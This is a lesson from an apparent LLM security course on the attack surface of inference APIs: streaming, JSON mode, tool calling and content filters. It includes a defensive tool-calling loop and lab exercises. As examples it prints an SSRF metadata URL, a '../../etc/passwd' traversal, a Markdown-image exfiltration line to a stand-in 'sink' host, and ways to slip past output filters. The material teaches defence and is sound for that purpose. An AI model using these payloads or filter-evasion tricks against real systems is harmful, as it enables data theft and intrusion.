<div class="prereq">

**Prerequisites.** [02.1 Where the boundaries really are](lesson-01.md),
[01.1 AppSec primitives](../module-01/lesson-01.md). Helpful: sibling
[LLM Research Engineer](https://tal-giladi.github.io/llm-research-engineer-course/) M06.3
(decoding: greedy/temperature/top-k/top-p) and M18 (tool schemas / function calling). We do not
reteach *how* function calling or decoding work — we analyze their **security** properties.

**You will learn.** The security surface of the *inference API* itself, the layer between your
app and the model: streaming, structured output / JSON mode, function/tool calling, and content
filters. For each, what it appears to guarantee, where the boundary really is, and how it is
bypassed — so that in Stage 2+ you already know which mechanism an attack is abusing.

**Why this matters.** Teams routinely assume "JSON mode means I get valid, safe JSON," "the tool
schema constrains what the model can do," or "the provider's content filter catches bad output."
Each assumption hides a boundary that is softer than it looks. Getting these right is most of
building an LLM app that does not fall over on first contact with an attacker.

</div>

# 02.2 · The inference API attack surface

## Why this matters

The model is only half the system. The other half is the API contract you build around it:
messages in, tokens streaming out, tool-call requests you execute, structured output you parse,
filters you trust. Attackers rarely need to touch the weights — they abuse *these mechanisms*.
This lesson catalogs the surface so that when Module 04 says "the injection escapes JSON mode" or
Module 17 says "the tool schema didn't constrain the arguments," you already know exactly which
promise was overstated.

## Learning objectives

By the end you can:

1. Describe the request/response contract of a modern inference API and mark its trust boundaries.
2. Explain the security implications of **streaming** (partial output, filter timing, early side
   effects).
3. State what **structured output / JSON mode** guarantees (syntactic) and what it does not
   (semantic/safety), and why "valid JSON" ≠ "safe values."
4. Explain **function/tool calling** as *the model emitting a request your code executes*, and
   why the schema constrains shape but not intent.
5. Reason about **content filters** (input and output) as probabilistic classifiers with
   precision/recall, latency, and bypasses.
6. Instrument a local API loop to observe each boundary.

## Concept

### The contract and its boundaries

A modern chat/inference API call looks like:

```text
Request:  { messages:[{role, content}...], tools:[{name, schema}...],
            response_format?, temperature, max_tokens, stream? }
Response: text  OR  a tool_call {name, arguments}   (streamed as token deltas if stream=true)
```

Draw the boundaries (00.1):

```text
        ┌──── your trust boundary ────┐         ┌── provider boundary ──┐
[client]─▶( your app: builds messages )─────────▶( inference API + model )
             ▲   executes tool_calls    ◀─deltas─       │ input filter
             │   parses structured out            output filter (maybe)
        [tools / DB / network]
```

Two facts drive everything below: (1) the **tool_call your code executes** is produced by the
model, i.e. by attacker-influenceable text; (2) any **filter** is a classifier with error rates,
not a gate. The API gives you *mechanisms*, and each has a real boundary that differs from its
marketing.

### Streaming

`stream=true` returns token deltas as they are generated. Security-relevant properties:

- **Output filters race the stream.** If a filter runs on the *complete* output, streaming that
  output to the user *before* the filter finishes can expose content the filter would have
  blocked. If it runs incrementally, it sees only prefixes and can miss content that is only
  unsafe once complete (e.g. a secret split across deltas, or a payload whose meaning depends on
  its end).
- **Early side effects.** Apps that act on partial output (rendering Markdown/HTML live, starting
  a tool call from a partially parsed structure) can be driven by content that never "finishes"
  or that changes meaning by the end.
- **Denial of service / cost.** A prompt that induces very long generations burns tokens/latency;
  streaming makes it feel responsive but does not cap the cost (see M23 unbounded consumption).

### Structured output / JSON mode

JSON mode (and grammar/schema-constrained decoding) makes the model emit output conforming to a
syntax or JSON Schema. What it guarantees is **syntactic**: you will (usually) get parseable JSON
of the right shape. What it does **not** guarantee:

- **Value safety.** `{"url": "http://169.254.169.254/..."}` is perfectly valid JSON. The schema
  constrains *types and shape*, not *whether the value is an SSRF payload or a canary*.
- **Semantic truth.** A field `"authorized": true` is just text the model produced; it is not an
  authorization decision.
- **Injection-freedom.** A string field can contain instructions, markup, or exfiltration
  payloads that your downstream code then mishandles (classic injection, now with the model as
  source — 01.1).

<div class="callout key">

**JSON mode is a parser convenience, not a security control.** It removes "the model returned
prose I couldn't parse" as a failure mode. It does nothing about *what the values mean or do*.
Every field you act on must be validated and authorized in your code exactly as if it came from
an untrusted user — because, transitively, it did.

</div>

### Function / tool calling

Function calling is often misread as "the model can call functions." Precisely: **the model emits
a structured request** `{name, arguments}`, and **your code decides whether and how to execute
it.** The schema you provide constrains the *shape* of `arguments` (types, enum, required
fields). It does **not** constrain:

- **Which** tool is requested among those you exposed (the model chooses; attacker text can
  steer the choice).
- **Argument values** beyond the schema's type/enum constraints (a `path` string can be
  `../../etc/passwd`; an `amount` can be huge within `number`).
- **Intent / authorization** — nothing in the mechanism checks the *caller is allowed* to perform
  this action on this resource. That check is yours to write (and 00.1 says it must live in code).

The security posture, then: exposing a tool = granting a capability reachable by model-influenced
text; the schema is input validation for *shape only*; authz, value validation, and side-effect
control are entirely your responsibility. This is the seed of all of Stage 7 (agent security).

### Content filters

Providers (and you) may run **input filters** (block/flag the prompt) and **output filters**
(block/flag the response). Treat every filter as a **probabilistic classifier**:

- It has **precision** (of the things it flags, how many are truly bad) and **recall** (of the
  truly bad things, how many it catches). You cannot maximize both; there is a threshold trade-off
  (ROC curve — Module 24).
- **False negatives** = bypasses (encoded/obfuscated/OOD content it does not recognize — the
  coverage argument from 02.1).
- **False positives** = blocked legitimate use (utility cost, user frustration).
- It adds **latency** and can itself be a target (prompt the model to phrase output to slip past
  a known filter).

<div class="callout blue">

**Filters are defense-in-depth, never the boundary.** A content filter lowers ASR; it does not
make an action safe. If executing a tool call would be dangerous, the safety must come from *not
having the capability / authorizing it in code*, not from hoping a classifier flags the request.

</div>

## Intuition

The inference API is a set of *convenience mechanisms* that each quietly shift work back onto you.
JSON mode hands you parseable output and the responsibility for its values. Tool calling hands
you a structured request and the responsibility for authorizing it. Streaming hands you low
latency and the responsibility for filter timing and partial-output side effects. Filters hand
you a risk reduction and the responsibility for knowing their error rates. The recurring mistake
is accepting the convenience while assuming the vendor kept the responsibility. They didn't.

## Technical explanation & Code

A local, backend-agnostic loop that makes each boundary visible. It shows the *right* place to
put validation and authorization relative to the model's output.

```python
# api_surface.py — a secure-by-construction tool-calling loop (localhost only).
# Demonstrates: schema validates SHAPE; YOUR code validates VALUES + AUTHORIZATION.
import json
from dataclasses import dataclass

# ---- tools you expose = capabilities you grant ----------------------------------
TOOLS = {
    "lookup_order": {"type":"object","properties":{"order_id":{"type":"string"}},
                     "required":["order_id"]},
    "fetch_url":    {"type":"object","properties":{"url":{"type":"string"}},
                     "required":["url"]},
}

@dataclass
class Principal:              # WHO is this request acting for? (authn result)
    user_id: str
    tenant: str

def schema_ok(name, args) -> bool:
    # SHAPE only — this is all JSON mode / function-calling gives you for free.
    spec = TOOLS.get(name)
    if not spec: return False
    return all(k in args for k in spec["required"])

def authorized(principal: Principal, name, args) -> bool:
    # INTENT + VALUES — this is YOURS to write; the model/schema never did it.
    if name == "fetch_url":
        return is_allowlisted_host(args["url"])          # blocks SSRF / metadata / sink
    if name == "lookup_order":
        return owns_order(principal, args["order_id"])   # blocks cross-tenant access
    return False

def run_tool_call(principal, tool_call):
    name, args = tool_call["name"], tool_call["arguments"]
    if not schema_ok(name, args):        raise ValueError("bad shape")      # syntactic
    if not authorized(principal, name, args): raise PermissionError("denied")  # semantic/authz
    return dispatch(name, args)          # only reached if BOTH pass

# is_allowlisted_host / owns_order / dispatch: implement locally for the lab.
```

The single most important line of the lesson is that `authorized(...)` exists *and runs after the
model, on the model's output, in your code.* Remove it and the schema alone will happily let a
model-chosen `fetch_url("http://169.254.169.254/...")` or a cross-tenant `lookup_order` through.

## Mathematics

The quantitative core here is filter evaluation, previewed now, derived in Module 24.

A filter is a binary classifier. With true positives $TP$, false positives $FP$, false negatives
$FN$:

$$ \text{precision} = \frac{TP}{TP+FP}, \qquad \text{recall} = \frac{TP}{TP+FN}. $$

Crucially, **precision depends on the base rate.** If genuine attacks are rare (prevalence $\pi$
small) and the filter has true-positive rate (recall) $t$ and false-positive rate $f$, then by
Bayes the probability a *flagged* item is truly an attack is

$$ P(\text{attack} \mid \text{flagged}) = \frac{t\,\pi}{t\,\pi + f\,(1-\pi)}. $$

For rare attacks ($\pi \to 0$) even a good filter ($t=0.95, f=0.02$) yields low precision — most
alerts are false. This is why "our filter is 98% accurate" is nearly meaningless without the base
rate, and why filters are triage, not gates. You will compute this for a real detector in M24.

## Attack / Defense model

<div class="callout guarantee">

**Guarantee analysis — provider/output content filter.**
- **Stops:** a fraction (its recall) of *recognized* harmful content; useful risk reduction.
- **Does NOT stop:** encoded/obfuscated/OOD content (false negatives), unsafe *actions* (it reads
  text, not capabilities), or anything whose harm is in a downstream side effect.
- **Attacker adapts:** obfuscation, splitting across streamed deltas, phrasing to evade the known
  classifier, or moving the harm into a tool call the filter never inspects.
- **False-positive cost:** blocked legitimate requests; with low attack base rates, most alerts
  are false (Bayes above), driving alert fatigue.
- **Performance cost:** added latency; a second model call for LLM-based filters.
- **Takeaway:** stack it *behind* real controls (least-privilege tools, authz in code, sandbox),
  never in front of them as the boundary.

</div>

## Real-world examples

- **JSON-mode value abuse** — apps that trust `{"authorized": true}` or act on a URL/path field
  without validation; ordinary injection/SSRF/IDOR with the model as the untrusted source.
- **Streamed-output rendering** — live-rendering model Markdown so an `![](http://sink/?d=...)`
  fires an outbound request before any output filter completes (exfiltration channel; M18).
- **Over-broad tool exposure** — shipping a `run_shell`/`fetch_url` tool "for flexibility" grants
  a capability the schema does nothing to constrain; the root of many agent incidents (Stage 7).

## Practical lab

<div class="lab">

**Lab 02.2 — Put the boundary in the right place.** CPU-only; localhost only; uses `api_surface.py`
plus a stubbed model that emits chosen tool calls (so you control the "attacker-influenced"
output deterministically — no real model needed). Expected time: 60–90 min.

</div>

## Exercise

Complete all parts.

1. **Implement** `is_allowlisted_host`, `owns_order`, and `dispatch` for a two-tenant toy (tenants
   `acme`/`globex`, a few orders each, an allowlist of one safe host plus the local sink treated
   as *not* allowlisted). Wire a stub "model" that returns a tool call you specify.
2. **Break it with the authz check removed.** Temporarily delete the `authorized(...)` call. Show
   two exploits driven purely by the stub model's output: (a) a cross-tenant `lookup_order`, and
   (b) a `fetch_url` to `169.254.169.254` (or the local sink). Confirm the schema check passed
   both — proving shape ≠ safety.
3. **Restore the check** and show both are now denied. State which line is the actual boundary.
4. **JSON-mode values.** Add a tool whose schema has a `path: string`. Show that a schema-valid
   `path` of `../../secrets/LAB-CANARY` is accepted by `schema_ok` and must be rejected by your
   own validation. Implement the validation and a bypass attempt (purple team), then harden.
5. **Streaming timing (reason + minimal demo).** Simulate an output filter that only decides on
   the *complete* string. Show a case where streaming a canary-containing prefix to a "renderer"
   (a function that extracts URLs and records outbound requests to your local sink) leaks the
   canary before the filter would have blocked the full message. Then fix it by buffering until
   the filter decides, and state the latency cost.
6. **Filter precision (compute).** Assume attacks have prevalence $\pi = 0.01$ and your filter has
   recall $t=0.9$, false-positive rate $f=0.05$. Compute $P(\text{attack}\mid\text{flagged})$.
   Then compute the $\pi$ at which precision reaches 0.5. Interpret both for on-call alerting.

<details>
<summary>Hint (step 5)</summary>

The vulnerability is that a *side effect* (the renderer's outbound request) happens on a prefix,
before the whole-message filter runs. Any control that must see the full output has to gate the
side effect, not just the final display. The fix trades latency (buffer to end) for safety —
exactly the streaming trade-off named in the lesson.

</details>

**Deliverable.** The working two-tenant loop, the two exploits (pre-fix) and their denials
(post-fix), the path-validation bypass+fix, the streaming-leak demo+fix, and your two Bayes
computations with one-line interpretations.

```bash
py course.py complete 02.2
```

## Research paper

No single paper — this is engineering foundation. Read instead: your primary model provider's
**function/tool-calling** and **structured-output** documentation, and their **content-filtering /
moderation** documentation. *What to extract:* find the exact sentences stating what is
guaranteed (shape, availability) vs what is explicitly the caller's responsibility (validation,
authorization, safety of actions). Note where the docs say "you should validate" — that sentence
is the boundary this lesson is about. (Distinguish DOCUMENTED guarantee vs recommended practice.)

## Further reading

- JSON Schema specification (validation keywords) — to know exactly what shape constraints can and
  cannot express (they cannot express "not an SSRF payload").
- OWASP LLM Top 10: **LLM05 Improper Output Handling** and **LLM06 Excessive Agency** — the
  standardized names for the two failure modes in this lesson; mapped in `references/standards-map.md`.

## Assessment

<details><summary>Q1. What does JSON mode guarantee and what does it not?</summary>

It guarantees (largely) syntactic conformance — parseable JSON of the specified shape/types. It
does not guarantee value safety (a valid string can be an SSRF/canary payload), semantic truth (a
`"authorized": true` field is just generated text), or injection-freedom. Every acted-on value
must be validated and authorized in your code as untrusted input.

</details>

<details><summary>Q2. Function calling: what does the tool schema constrain, and what is your job?</summary>

The schema constrains the *shape* of the arguments (types, required fields, enums). Your code must
decide whether to execute at all, validate argument *values* (paths, URLs, amounts), and enforce
*authorization* (is this principal allowed this action on this resource). Exposing a tool grants a
capability reachable by model-influenced text; only your code turns that into a safe action.

</details>

<details><summary>Q3. Why can't a content filter be the security boundary?</summary>

It is a probabilistic classifier with finite recall (bypassable by obfuscation/OOD content) and,
at low attack base rates, low precision (most alerts false, by Bayes). It reads text, not
capabilities, so it cannot make an unsafe *action* safe. It reduces risk (defense-in-depth) but
must sit behind real controls (least privilege, authz in code, sandboxing).

</details>

<details><summary>Q4. Name one security pitfall unique to streaming and its fix.</summary>

Acting on partial output before an output filter (which decides on the complete message)
finishes — e.g. live-rendering a URL that fires an outbound request, leaking a canary before the
block would apply. Fix: gate the side effect on the filter's decision (buffer until decided),
accepting added latency; or run the side-effect-producing step only on validated, complete output.

</details>

## What you should now be able to do

- Draw the inference-API trust boundaries and place validation/authorization on the correct side.
- State the real guarantees of streaming, JSON mode, tool calling, and filters — and their gaps.
- Build a tool-calling loop where the schema checks shape and *your code* checks values and authz.
- Evaluate a filter with precision/recall and the base-rate (Bayes) correction.

## Progress checkpoint

```bash
py course.py complete 02.2
py course.py next
```

**Next:** Stage 2 opens with **direct prompt injection & the instruction hierarchy** (Module 04),
where these mechanisms — the message hierarchy (02.1) and the API surface (02.2) — are attacked
in the first Docker lab with a toy vulnerable app and synthetic canaries.
